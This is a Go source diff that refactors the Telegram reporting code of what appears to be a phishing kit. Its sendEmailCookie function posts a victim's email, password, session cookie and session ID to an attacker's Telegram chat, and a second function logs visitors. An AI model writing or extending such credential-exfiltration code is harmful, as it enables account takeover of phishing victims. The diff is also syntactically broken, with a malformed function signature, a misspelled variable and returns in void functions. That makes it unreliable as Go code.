@@ -42,26 +42,27 @@ func getUrl() string {
 	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
 }
 
-func telegramSendResult(msg string) (bool, error){
-	// Global variables
-	var err error
-	var request *http.Response
+func getChatId string {
+	//get ChAT_ID from .env
 	ChatId := goDotEnvVariable("CHAT_ID")
+	return fmt.Sprintf("%s", ChatId)
+}
+
+func telegramSendResult(msg string){
+	
+	var request *http.Response
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	// Send the message
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	body, _ := json.Marshal(map[string]string{
-		"chat_id": ChatId,
+		"chat_id": getChatId(),
 		"text":    msg,
 	})
 	responseBody := bytes.NewBuffer(body)
 	request, _ := http.Post(url, "application/json", responseBody)
-	if err != nil {
-		return false, err
-	}
 
 	// Close the request at the end
-	defer response.Body.Close()
+	defer request.Body.Close()
 	
 	// Body
 	body, err = ioutil.ReadAll(request.Body)
@@ -69,22 +70,16 @@ func telegramSendResult(msg string) (bool, error){
 		return false, err
 	}
 	log.Printf("%s", msg)
-	// Return
-	return true, nil
 
 }
 
 func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
-	
-	// Global variables
-	var request *http.Response
-	ChatId := goDotEnvVariable("CHAT_ID")
-	
+
 	// Send the message
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 
 	postBody, _ := json.Marshal(map[string]string{
-		"chat_id":    ChatID,
+		"chat_id":    getChatId(),
 		" 🌟 Email ":      username,
 		" 🔑 Password ":   password,
 		" 🍪 Cookie_results":     msg,
@@ -115,17 +110,14 @@ func telegramSendVisitor(msg string) {
 	var request *http.Response
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	body, _ := json.Marshal(map[string]string{
-		"chat_id": ChatId,
+		"chat_id": getChatId(),
 		"text":    msg,
 	})
 	responseBody := bytes.NewBuffer(body)
 	request, _ := http.Post(url, "application/json", responseBody)
-	if err != nil {
-		return false, err
-	}
 
 	// Close the request at the end
-	defer response.Body.Close()
+	defer reqest.Body.Close()
 	
 	// Body
 	body, err = ioutil.ReadAll(request.Body)
@@ -133,8 +125,6 @@ func telegramSendVisitor(msg string) {
 		return false, err
 	}
 	fmt.Println("Successfully sent mail to all user in telegram: %s", msg)
-	// Return
-	return true, nil
 }
 
 type Database struct {
